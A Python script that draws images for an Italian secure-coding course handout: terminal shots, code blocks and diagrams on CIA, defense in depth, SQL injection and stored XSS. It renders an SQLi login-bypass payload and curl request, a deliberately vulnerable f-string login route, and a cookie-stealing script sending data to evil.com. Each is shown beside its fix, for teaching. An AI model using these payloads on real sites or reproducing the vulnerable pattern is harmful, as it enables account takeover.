"""Genera bitmap stilizzati (terminale, code editor, diagrammi) da includere nella dispensa.

Output: 12+ file PNG in questa cartella.
"""

from PIL import Image, ImageDraw, ImageFont
import os
import platform

# === FONT ===
def get_font(size: int, bold: bool = False, mono: bool = False):
    """Ottieni font, fallback se non trovato."""
    candidates_mono = [
        "C:/Windows/Fonts/consola.ttf",
        "C:/Windows/Fonts/consolab.ttf" if bold else "C:/Windows/Fonts/consola.ttf",
        "/System/Library/Fonts/Menlo.ttc",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    ]
    candidates_sans = [
        "C:/Windows/Fonts/segoeuib.ttf" if bold else "C:/Windows/Fonts/segoeui.ttf",
        "/System/Library/Fonts/Helvetica.ttc",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold
        else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
    ]
    paths = candidates_mono if mono else candidates_sans
    for p in paths:
        if os.path.exists(p):
            try:
                return ImageFont.truetype(p, size)
            except Exception:
                continue
    return ImageFont.load_default()


def terminal_image(filename: str, lines: list, width: int = 1100,
                   title: str = "PowerShell"):
    """Genera un'immagine stile terminale dark con prompt e output.

    lines: lista di tuple (type, text) dove type ∈ {'cmd', 'out', 'err', 'prompt'}
    """
    pad_x, pad_y = 18, 14
    line_h = 22
    header_h = 36
    n_lines = len(lines) + 1
    height = header_h + 2 * pad_y + n_lines * line_h

    img = Image.new("RGB", (width, height), color=(28, 28, 38))
    draw = ImageDraw.Draw(img)

    # Header barra (macOS style con 3 pallini)
    draw.rectangle([0, 0, width, header_h], fill=(45, 45, 55))
    for i, color in enumerate([(255, 95, 86), (255, 189, 46), (39, 201, 63)]):
        cx = 16 + i * 22
        draw.ellipse([cx, 10, cx + 14, 24], fill=color)
    # Titolo finestra
    font_title = get_font(14, bold=False, mono=False)
    bbox = draw.textbbox((0, 0), title, font=font_title)
    tw = bbox[2] - bbox[0]
    draw.text(((width - tw) // 2, 8), title, fill=(170, 170, 180), font=font_title)

    # Contenuto
    font_mono = get_font(16, mono=True)
    y = header_h + pad_y
    for kind, text in lines:
        if kind == "cmd":
            # Prompt + comando
            prompt = "PS C:\\> " if title.lower().startswith("power") else "$ "
            draw.text((pad_x, y), prompt, fill=(85, 230, 156), font=font_mono)
            bbox = draw.textbbox((0, 0), prompt, font=font_mono)
            pw = bbox[2] - bbox[0]
            draw.text((pad_x + pw, y), text, fill=(255, 255, 255), font=font_mono)
        elif kind == "out":
            draw.text((pad_x, y), text, fill=(200, 200, 215), font=font_mono)
        elif kind == "err":
            draw.text((pad_x, y), text, fill=(255, 110, 110), font=font_mono)
        elif kind == "warn":
            draw.text((pad_x, y), text, fill=(255, 200, 100), font=font_mono)
        elif kind == "ok":
            draw.text((pad_x, y), text, fill=(110, 230, 156), font=font_mono)
        elif kind == "prompt":
            # solo cursore
            draw.text((pad_x, y), "PS C:\\> _", fill=(85, 230, 156), font=font_mono)
        y += line_h

    img.save(filename, optimize=True)
    print(f"  {filename}")


# === SIMPLE SYNTAX HIGHLIGHT ===
PY_KEYWORDS = {"def", "class", "import", "from", "as", "return", "if", "else",
               "elif", "while", "for", "in", "not", "and", "or", "try", "except",
               "finally", "with", "yield", "lambda", "pass", "raise", "True",
               "False", "None"}


def tokenize_python(line: str):
    """Tokenizer minimale per evidenziazione syntax."""
    tokens = []
    i = 0
    n = len(line)
    while i < n:
        c = line[i]
        # commento
        if c == "#":
            tokens.append(("comment", line[i:]))
            break
        # stringa
        if c in ('"', "'"):
            quote = c
            j = i + 1
            while j < n and line[j] != quote:
                if line[j] == "\\" and j + 1 < n:
                    j += 2
                else:
                    j += 1
            tokens.append(("string", line[i:j+1]))
            i = j + 1
            continue
        # parola
        if c.isalpha() or c == "_":
            j = i
            while j < n and (line[j].isalnum() or line[j] == "_"):
                j += 1
            word = line[i:j]
            kind = "keyword" if word in PY_KEYWORDS else "ident"
            # decoratore
            if i > 0 and line[i-1] == "@":
                kind = "decorator"
            tokens.append((kind, word))
            i = j
            continue
        # numero
        if c.isdigit():
            j = i
            while j < n and (line[j].isdigit() or line[j] == "."):
                j += 1
            tokens.append(("number", line[i:j]))
            i = j
            continue
        # decoratore
        if c == "@":
            tokens.append(("decorator", "@"))
            i += 1
            continue
        # whitespace / altro
        tokens.append(("plain", c))
        i += 1
    return tokens


CODE_COLORS = {
    "keyword": (199, 146, 234),
    "string": (158, 220, 130),
    "comment": (118, 128, 138),
    "ident": (235, 235, 240),
    "decorator": (255, 200, 80),
    "number": (240, 180, 110),
    "plain": (235, 235, 240),
}


def code_image(filename: str, code: str, lang: str = "python",
               title: str = None, width: int = 1100):
    """Render di un blocco di codice con highlight basico in stile editor scuro."""
    pad_x, pad_y = 18, 14
    line_h = 22
    header_h = 36 if title else 0
    lines = code.split("\n")
    height = header_h + 2 * pad_y + len(lines) * line_h

    img = Image.new("RGB", (width, height), color=(30, 30, 40))
    draw = ImageDraw.Draw(img)

    # Header
    if title:
        draw.rectangle([0, 0, width, header_h], fill=(45, 45, 55))
        font_title = get_font(14, bold=True, mono=False)
        draw.text((pad_x, 8), f"  {title}", fill=(200, 200, 215), font=font_title)
        # Linguaggio badge a destra
        font_badge = get_font(12, mono=True)
        bbox = draw.textbbox((0, 0), lang.upper(), font=font_badge)
        bw = bbox[2] - bbox[0]
        draw.rounded_rectangle([width - bw - 30, 8, width - 14, 28],
                                 radius=4, fill=(0, 160, 176))
        draw.text((width - bw - 22, 10), lang.upper(),
                  fill=(255, 255, 255), font=font_badge)

    # Gutter numero riga
    gutter_w = 50
    draw.rectangle([0, header_h, gutter_w, height], fill=(36, 36, 46))

    font_mono = get_font(15, mono=True)
    font_lineno = get_font(13, mono=True)

    y = header_h + pad_y
    for idx, line in enumerate(lines, start=1):
        # line number
        ln_str = str(idx)
        bbox = draw.textbbox((0, 0), ln_str, font=font_lineno)
        lw = bbox[2] - bbox[0]
        draw.text((gutter_w - lw - 8, y + 2), ln_str,
                  fill=(90, 95, 105), font=font_lineno)

        # tokens
        x = gutter_w + 12
        if lang == "python":
            tokens = tokenize_python(line)
            for kind, text in tokens:
                color = CODE_COLORS.get(kind, (235, 235, 240))
                draw.text((x, y), text, fill=color, font=font_mono)
                bbox = draw.textbbox((0, 0), text, font=font_mono)
                x += bbox[2] - bbox[0]
        else:
            # SQL: highlight molto basico (keyword maiuscole, stringhe)
            color_main = (235, 235, 240)
            tokens = line.split(" ")
            cur_x = x
            for t in tokens:
                if t.upper() in {"SELECT", "FROM", "WHERE", "AND", "OR",
                                  "UNION", "INSERT", "UPDATE", "DELETE",
                                  "JOIN", "ON", "ORDER", "BY"}:
                    color = (199, 146, 234)
                elif t.startswith("'") and t.endswith("'"):
                    color = (158, 220, 130)
                elif t.startswith("--"):
                    color = (118, 128, 138)
                else:
                    color = color_main
                draw.text((cur_x, y), t, fill=color, font=font_mono)
                bbox = draw.textbbox((0, 0), t + " ", font=font_mono)
                cur_x += bbox[2] - bbox[0]

        y += line_h

    img.save(filename, optimize=True)
    print(f"  {filename}")


def banner_image(filename: str, title: str, subtitle: str,
                  width: int = 1400, height: int = 380):
    """Cover banner per dispensa: gradient + titolo grande."""
    img = Image.new("RGB", (width, height), color=(15, 45, 82))
    draw = ImageDraw.Draw(img)

    # Gradient simulato: bande verticali da blu scuro a teal
    for x in range(width):
        t = x / width
        r = int(15 + (0 - 15) * t)
        g = int(45 + (160 - 45) * t)
        b = int(82 + (176 - 82) * t)
        draw.line([(x, 0), (x, height)], fill=(r, g, b))

    # Pattern decorativo: cerchi sfumati
    for cx, cy, r in [(width - 200, 80, 120),
                       (width - 80, height - 100, 80),
                       (150, height - 50, 60)]:
        for rr in range(r, 0, -10):
            alpha = max(20, 100 - rr // 2)
            color = (255, 255, 255, alpha)
            draw.ellipse([cx - rr, cy - rr, cx + rr, cy + rr],
                          outline=(255, 255, 255, alpha), width=2)

    # Accent line laterale
    draw.rectangle([0, 80, 8, 280], fill=(0, 200, 220))

    # Titolo principale
    font_main = get_font(72, bold=True)
    draw.text((60, 100), title, fill=(255, 255, 255), font=font_main)

    # Sottotitolo
    font_sub = get_font(28)
    draw.text((60, 220), subtitle, fill=(200, 220, 240), font=font_sub)

    # Etichetta in alto
    font_label = get_font(16, bold=True)
    draw.text((60, 50), "CORSO IFTS STEM",
              fill=(0, 200, 220), font=font_label)

    img.save(filename, optimize=True)
    print(f"  {filename}")


def diagram_dfd(filename: str, width: int = 1200, height: int = 500):
    """Diagramma DFD semplice per Cap 2 STRIDE light."""
    img = Image.new("RGB", (width, height), color=(245, 247, 250))
    draw = ImageDraw.Draw(img)

    font_box = get_font(18, bold=True)
    font_label = get_font(14)
    font_small = get_font(12)

    BLUE = (15, 45, 82)
    TEAL = (0, 160, 176)
    GREY = (107, 114, 128)

    # Utente (rettangolo a sinistra)
    draw.rounded_rectangle([60, 200, 240, 280], radius=8,
                            outline=BLUE, width=3, fill=(255, 255, 255))
    draw.text((100, 222), "Utente", fill=BLUE, font=font_box)
    draw.text((85, 250), "(entità esterna)", fill=GREY, font=font_small)

    # Webapp (cerchio centro)
    draw.ellipse([420, 180, 620, 320], outline=BLUE, width=3,
                  fill=(255, 255, 255))
    draw.text((475, 222), "Webapp", fill=BLUE, font=font_box)
    draw.text((488, 250), "(processo)", fill=GREY, font=font_small)

    # DB Users (datastore)
    draw.line([800, 80, 1080, 80], fill=BLUE, width=3)
    draw.line([800, 140, 1080, 140], fill=BLUE, width=3)
    draw.text((880, 92), "DB Users", fill=BLUE, font=font_box)

    # DB Posts (datastore)
    draw.line([800, 380, 1080, 380], fill=BLUE, width=3)
    draw.line([800, 440, 1080, 440], fill=BLUE, width=3)
    draw.text((880, 392), "DB Posts", fill=BLUE, font=font_box)

    # Frecce
    # Utente -> Webapp
    draw.line([240, 240, 415, 240], fill=TEAL, width=2)
    # Punta freccia
    draw.polygon([(410, 235), (420, 240), (410, 245)], fill=TEAL)
    draw.text((275, 215), "HTTPS request", fill=TEAL, font=font_label)

    # Webapp <-> Webapp risposta
    draw.line([240, 260, 415, 260], fill=TEAL, width=2)
    draw.polygon([(245, 255), (235, 260), (245, 265)], fill=TEAL)

    # Webapp -> DB Users
    draw.line([590, 200, 800, 110], fill=TEAL, width=2)
    draw.polygon([(795, 105), (805, 113), (795, 120)], fill=TEAL)
    draw.text((620, 145), "SQL", fill=TEAL, font=font_label)

    # Webapp -> DB Posts
    draw.line([590, 300, 800, 410], fill=TEAL, width=2)
    draw.polygon([(795, 405), (805, 413), (795, 415)], fill=TEAL)
    draw.text((620, 335), "SQL", fill=TEAL, font=font_label)

    # Trust boundary (tratteggi)
    for y in range(60, 460, 12):
        draw.line([330, y, 330, y + 6], fill=(228, 60, 70), width=2)
    draw.text((280, 30), "trust boundary: Internet → server",
              fill=(228, 60, 70), font=font_small)

    for y in range(60, 460, 12):
        draw.line([720, y, 720, y + 6], fill=(228, 60, 70), width=2)
    draw.text((670, 30), "trust boundary: server → DB",
              fill=(228, 60, 70), font=font_small)

    # Titolo
    font_title = get_font(20, bold=True)
    draw.text((40, 10), "Data Flow Diagram — Blog con login",
              fill=BLUE, font=font_title)

    img.save(filename, optimize=True)
    print(f"  {filename}")


def diagram_layered(filename: str, width: int = 1200, height: int = 600):
    """Diagramma defense in depth — strati concentrici."""
    img = Image.new("RGB", (width, height), color=(245, 247, 250))
    draw = ImageDraw.Draw(img)

    font_l = get_font(18, bold=True)
    font_s = get_font(14)
    font_title = get_font(22, bold=True)

    BLUE = (15, 45, 82)
    TEAL = (0, 160, 176)

    draw.text((40, 20), "Defense in Depth — strati di difesa",
              fill=BLUE, font=font_title)

    # Cerchi concentrici
    cx, cy = 600, 330
    layers = [
        (260, "Codice sicuro", "(SQLi, XSS, IDOR)", (228, 60, 70)),
        (220, "TLS / Header HTTP", "(HTTPS, HSTS, CSP)", (255, 153, 0)),
        (180, "Rate Limit + WAF", "(throttle, regole)", (244, 196, 48)),
        (140, "Firewall di rete", "(porte 443 only)", (90, 180, 100)),
        (100, "Network Segm.", "(DMZ, VPN)", (60, 140, 200)),
        (60, "Asset", "", BLUE),
    ]
    for r, label, sub, color in layers:
        draw.ellipse([cx - r, cy - r, cx + r, cy + r],
                      outline=color, width=4, fill=None)
        if label:
            font = get_font(14 if r < 80 else 16, bold=True)
            # Posiziona label sopra al cerchio
            bbox = draw.textbbox((0, 0), label, font=font)
            tw = bbox[2] - bbox[0]
            draw.text((cx - tw // 2, cy - r - 25), label, fill=color, font=font)

    # Legenda a destra
    draw.text((900, 80), "Bucare 1 strato", fill=(228, 60, 70), font=font_l)
    draw.text((900, 105), "NON basta:", fill=BLUE, font=font_l)
    draw.text((900, 145), "ne servono di più", fill=BLUE, font=font_s)
    draw.text((900, 165), "perché il sistema", fill=BLUE, font=font_s)
    draw.text((900, 185), "venga compromesso.", fill=BLUE, font=font_s)

    img.save(filename, optimize=True)
    print(f"  {filename}")


def diagram_cia(filename: str, width: int = 1200, height: int = 500):
    """Diagramma CIA Triad."""
    img = Image.new("RGB", (width, height), color=(245, 247, 250))
    draw = ImageDraw.Draw(img)

    font_title = get_font(24, bold=True)
    font_main = get_font(28, bold=True)
    font_sub = get_font(16)

    BLUE = (15, 45, 82)
    TEAL = (0, 160, 176)
    RED = (228, 60, 70)
    GREEN = (6, 167, 125)
    ORANGE = (255, 153, 0)

    draw.text((40, 20), "La CIA Triad", fill=BLUE, font=font_title)

    # Triangolo
    cx, cy = 600, 290
    r = 180

    p1 = (cx, cy - r)              # in alto
    p2 = (cx - int(r * 0.866), cy + r // 2)  # in basso sinistra
    p3 = (cx + int(r * 0.866), cy + r // 2)  # in basso destra

    # Triangolo principale
    draw.polygon([p1, p2, p3], outline=BLUE, width=3, fill=(255, 255, 255))

    # Etichette ai vertici
    # C in alto
    draw.ellipse([cx - 70, cy - r - 50, cx + 70, cy - r + 10],
                  fill=RED, outline=BLUE, width=3)
    draw.text((cx - 14, cy - r - 35), "C", fill=(255, 255, 255), font=font_main)
    draw.text((cx - 80, cy - r + 25), "Confidentiality", fill=BLUE, font=font_sub)

    # I in basso a sinistra
    draw.ellipse([p2[0] - 60, p2[1] - 30, p2[0] + 60, p2[1] + 30],
                  fill=ORANGE, outline=BLUE, width=3)
    draw.text((p2[0] - 10, p2[1] - 18), "I", fill=(255, 255, 255), font=font_main)
    draw.text((p2[0] - 50, p2[1] + 40), "Integrity", fill=BLUE, font=font_sub)

    # A in basso a destra
    draw.ellipse([p3[0] - 60, p3[1] - 30, p3[0] + 60, p3[1] + 30],
                  fill=GREEN, outline=BLUE, width=3)
    draw.text((p3[0] - 14, p3[1] - 18), "A", fill=(255, 255, 255), font=font_main)
    draw.text((p3[0] - 50, p3[1] + 40), "Availability", fill=BLUE, font=font_sub)

    # Descrizioni
    draw.text((50, 200), "Confidentiality:", fill=BLUE, font=font_sub)
    draw.text((50, 225), "dati visibili solo a chi", fill=BLUE, font=get_font(13))
    draw.text((50, 245), "è autorizzato a vederli", fill=BLUE, font=get_font(13))

    draw.text((900, 200), "Integrity:", fill=BLUE, font=font_sub)
    draw.text((900, 225), "dati non modificati", fill=BLUE, font=get_font(13))
    draw.text((900, 245), "senza autorizzazione", fill=BLUE, font=get_font(13))

    draw.text((900, 380), "Availability:", fill=BLUE, font=font_sub)
    draw.text((900, 405), "sistema funzionante", fill=BLUE, font=get_font(13))
    draw.text((900, 425), "quando serve", fill=BLUE, font=get_font(13))

    img.save(filename, optimize=True)
    print(f"  {filename}")


def diagram_sqli(filename: str, width: int = 1200, height: int = 500):
    """Diagramma flusso SQL Injection."""
    img = Image.new("RGB", (width, height), color=(245, 247, 250))
    draw = ImageDraw.Draw(img)

    font_title = get_font(22, bold=True)
    font_box = get_font(15, bold=True)
    font_label = get_font(13)
    font_code = get_font(13, mono=True)

    BLUE = (15, 45, 82)
    RED = (228, 60, 70)
    GREEN = (6, 167, 125)
    GREY = (107, 114, 128)

    draw.text((40, 20), "Anatomia di un attacco SQL Injection",
              fill=BLUE, font=font_title)

    # 1. Form input
    draw.rounded_rectangle([40, 80, 280, 200], radius=10,
                            outline=BLUE, width=3, fill=(255, 255, 255))
    draw.text((60, 95), "1. Form di login", fill=BLUE, font=font_box)
    draw.text((60, 125), "Email:", fill=GREY, font=font_label)
    draw.text((60, 145), "' OR '1'='1' --", fill=RED, font=font_code)
    draw.text((60, 170), "Password:", fill=GREY, font=font_label)
    draw.text((60, 188), "qualunque", fill=BLUE, font=font_code)

    # Freccia 1
    draw.line([280, 140, 420, 140], fill=BLUE, width=3)
    draw.polygon([(415, 135), (425, 140), (415, 145)], fill=BLUE)

    # 2. App costruisce query
    draw.rounded_rectangle([430, 80, 760, 200], radius=10,
                            outline=BLUE, width=3, fill=(255, 255, 255))
    draw.text((450, 95), "2. App costruisce SQL", fill=BLUE, font=font_box)
    draw.text((450, 125), "f-string mescola", fill=GREY, font=font_label)
    draw.text((450, 145), "struttura e dati:", fill=GREY, font=font_label)
    draw.text((450, 170), 'WHERE email=\'\' OR', fill=RED, font=font_code)
    draw.text((450, 188), "'1'='1' --'", fill=RED, font=font_code)

    # Freccia 2
    draw.line([760, 140, 900, 140], fill=BLUE, width=3)
    draw.polygon([(895, 135), (905, 140), (895, 145)], fill=BLUE)

    # 3. DB esegue
    draw.rounded_rectangle([910, 80, 1160, 200], radius=10,
                            outline=BLUE, width=3, fill=(255, 255, 255))
    draw.text((930, 95), "3. DB esegue", fill=BLUE, font=font_box)
    draw.text((930, 125), "'1'='1' sempre vero", fill=GREY, font=font_label)
    draw.text((930, 150), "→ restituisce TUTTI", fill=RED, font=font_label)
    draw.text((930, 170), "gli utenti", fill=RED, font=font_label)
    draw.text((930, 188), "🔥 LOGIN BYPASS", fill=RED, font=font_box)

    # Linea separatore
    draw.line([40, 230, 1160, 230], fill=GREY, width=1)

    # Soluzione
    draw.text((40, 250), "✅ La correzione: query parametrizzata",
              fill=GREEN, font=font_title)

    draw.rounded_rectangle([40, 290, 1160, 400], radius=10,
                            outline=GREEN, width=3, fill=(255, 255, 255))
    draw.text((60, 305), "Python (sqlite3):", fill=BLUE, font=font_box)
    draw.text((60, 335), 'sql = "SELECT id FROM users WHERE email = ? AND password = ?"',
              fill=BLUE, font=font_code)
    draw.text((60, 360), 'row = db.execute(sql, (email, pwd)).fetchone()',
              fill=BLUE, font=font_code)

    draw.text((60, 420), "I dati sono passati SEPARATAMENTE al driver, che li tratta come VALORI.",
              fill=GREY, font=font_label)
    draw.text((60, 442), "Anche con ' OR '1'='1' --, il driver cerca quella stringa LETTERALMENTE → nessun match.",
              fill=GREY, font=font_label)
    draw.text((60, 464), "SQLi diventa IMPOSSIBILE PER DESIGN. Non per filtraggio.",
              fill=GREEN, font=font_box)

    img.save(filename, optimize=True)
    print(f"  {filename}")


def diagram_xss_flow(filename: str, width: int = 1200, height: int = 480):
    """Flusso XSS Stored."""
    img = Image.new("RGB", (width, height), color=(245, 247, 250))
    draw = ImageDraw.Draw(img)

    font_title = get_font(22, bold=True)
    font_box = get_font(14, bold=True)
    font_label = get_font(13)
    font_code = get_font(13, mono=True)

    BLUE = (15, 45, 82)
    RED = (228, 60, 70)

    draw.text((40, 20), "XSS Stored: il flusso dell'attacco",
              fill=BLUE, font=font_title)

    boxes = [
        (40, 80, 260, 200, "1. Attaccante",
         ["Posta un commento", "con JavaScript nascosto:",
          "<script>", "fetch('evil.com?c='+", "  document.cookie)", "</script>"], BLUE),
        (290, 80, 510, 200, "2. Server",
         ["Salva il commento", "nel DB così com'è", "(no escape)", "", "Pensa: 'è testo'"], BLUE),
        (540, 80, 760, 200, "3. Vittima visita",
         ["Browser scarica HTML", "Trova <script>...</script>", "Lo ESEGUE", "", "(è il suo lavoro)"], BLUE),
        (790, 80, 1010, 200, "4. Furto",
         ["JS invia il cookie", "di sessione della", "VITTIMA all'attaccante", "", "🔥 Account takeover"], RED),
    ]
    for (x1, y1, x2, y2, title, lines, color) in boxes:
        draw.rounded_rectangle([x1, y1, x2, y2], radius=10,
                                outline=color, width=3, fill=(255, 255, 255))
        draw.text((x1 + 15, y1 + 10), title, fill=color, font=font_box)
        for i, line in enumerate(lines):
            font = font_code if line.startswith("<") or line.startswith("fetch") or line.startswith("  ") else font_label
            draw.text((x1 + 15, y1 + 40 + i * 20), line, fill=BLUE, font=font)

    # Frecce tra box
    for x in [260, 510, 760]:
        draw.line([x, 140, x + 28, 140], fill=BLUE, width=2)
        draw.polygon([(x + 24, 135), (x + 32, 140), (x + 24, 145)], fill=BLUE)

    # Soluzione
    draw.text((40, 240), "✅ Difesa: escape automatico + cookie HttpOnly",
              fill=(6, 167, 125), font=font_title)

    draw.rounded_rectangle([40, 280, 1010, 430], radius=10,
                            outline=(6, 167, 125), width=3, fill=(255, 255, 255))
    draw.text((60, 295), "Difesa primaria (Jinja2):", fill=BLUE, font=font_box)
    draw.text((60, 320), "<p>{{ comment }}</p>", fill=BLUE, font=font_code)
    draw.text((60, 343), "→ <script> trasformato in &lt;script&gt; (testo, non eseguito)",
              fill=(107, 114, 128), font=font_label)

    draw.text((60, 375), "Difesa secondaria (cookie):", fill=BLUE, font=font_box)
    draw.text((60, 400), "Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax",
              fill=BLUE, font=font_code)
    draw.text((60, 422), "→ HttpOnly: il JS NON può leggere il cookie. Anche con XSS, il token non viene rubato.",
              fill=(107, 114, 128), font=font_label)

    img.save(filename, optimize=True)
    print(f"  {filename}")


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    print("Generating images...")

    # Cover banner
    banner_image("cover_banner.png",
                  "Secure Coding",
                  "Dispensa del corso · 16 ore")

    # Cap 0 — Setup
    terminal_image("cap0_python_version.png", [
        ("cmd", "python --version"),
        ("ok", "Python 3.12.7"),
        ("cmd", "python -m venv .venv"),
        ("cmd", ".\\.venv\\Scripts\\Activate.ps1"),
        ("prompt", ""),
    ], title="Setup Python")

    terminal_image("cap0_flask_run.png", [
        ("cmd", "pip install flask"),
        ("out", "Collecting flask"),
        ("out", "Successfully installed flask-3.0.3"),
        ("cmd", "python hello_flask.py"),
        ("out", " * Running on http://127.0.0.1:5000"),
        ("out", " * Debug mode: on"),
    ], title="Flask Hello World")

    # Cap 1 — CIA + Defense
    diagram_cia("cap1_cia_triad.png")
    diagram_layered("cap1_defense_depth.png")

    # Cap 2 — DFD
    diagram_dfd("cap2_dfd_mini_blog.png")

    # Cap 3 — SQLi
    diagram_sqli("cap3_sqli_anatomia.png")
    code_image("cap3_sqli_vulnerable.png",
                """@app.route("/login", methods=["POST"])
def login():
    email = request.form["email"]
    pwd = request.form["password"]
    # 🚩 f-string in SQL = SQLi garantita
    sql = f"SELECT id FROM users WHERE email = '{email}' AND password = '{pwd}'"
    row = db.execute(sql).fetchone()
    if row:
        session["user_id"] = row["id"]
        return redirect("/dashboard")
    return "Login fallito", 401""",
                lang="python", title="app.py — VERSIONE VULNERABILE")

    code_image("cap3_sqli_safe.png",
                """@app.route("/login", methods=["POST"])
def login():
    email = request.form["email"]
    pwd = request.form["password"]
    # ✅ Query parametrizzata, separa struttura e dati
    sql = "SELECT id FROM users WHERE email = ? AND password = ?"
    row = db.execute(sql, (email, pwd)).fetchone()
    if row:
        session["user_id"] = row["id"]
        return redirect("/dashboard")
    return "Login fallito", 401""",
                lang="python", title="app.py — VERSIONE CORRETTA")

    terminal_image("cap3_sqli_attack.png", [
        ("cmd", "curl -X POST http://localhost:5000/login \\"),
        ("cmd", "  -d \"email=admin@bank.it' --&password=x\""),
        ("out", "HTTP/1.1 302 Found"),
        ("out", "Location: /dashboard"),
        ("ok", "✓ Login riuscito come admin (senza password!)"),
    ], title="Bash · curl")

    # Cap 4 — IDOR + bcrypt
    code_image("cap4_idor_safe.png",
                """@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    # ✅ Ownership check: filtra per owner
    f = Fattura.query.filter_by(
        id=fid,
        owner_id=session["user_id"]
    ).first_or_404()
    return render_template("fattura.html", fattura=f)""",
                lang="python", title="app.py — IDOR corretto con ownership check")

    code_image("cap4_bcrypt.png",
                """import bcrypt

def hash_password(password: str) -> bytes:
    # Salt automatico + cost=12 (~250ms per hash)
    return bcrypt.hashpw(password.encode("utf-8"),
                          bcrypt.gensalt(rounds=12))

def verify_password(password: str, hash_db: bytes) -> bool:
    return bcrypt.checkpw(password.encode("utf-8"), hash_db)""",
                lang="python", title="auth.py — Hashing password con bcrypt")

    # Cap 5 — XSS
    diagram_xss_flow("cap5_xss_flow.png")

    # Cap 6 — Pydantic + pip-audit
    code_image("cap6_pydantic.png",
                """from pydantic import BaseModel, EmailStr, Field, field_validator
from datetime import date

class UserCreate(BaseModel):
    username: str = Field(min_length=3, max_length=20,
                           pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    age: int = Field(ge=18, le=120)
    password: str = Field(min_length=12)
    birthdate: date

    @field_validator("birthdate")
    @classmethod
    def adult(cls, v):
        if (date.today() - v).days < 18*365:
            raise ValueError("devi essere maggiorenne")
        return v""",
                lang="python", title="schemas.py — Validation con Pydantic")

    terminal_image("cap6_pip_audit.png", [
        ("cmd", "pip-audit -r requirements.txt"),
        ("out", "Found 2 known vulnerabilities in 1 package"),
        ("warn", ""),
        ("warn", "Name   Version  ID                  Fix Versions"),
        ("warn", "flask  2.0.0    GHSA-m2qf-hxjv-5gpq 2.2.5"),
        ("warn", "flask  2.0.0    GHSA-4j93-pq9p-vpc2 2.3.2"),
        ("cmd", "pip install --upgrade flask"),
        ("cmd", "pip-audit"),
        ("ok", "No known vulnerabilities found ✓"),
    ], title="Bash · pip-audit")

    print("\nTutte le immagini generate.")
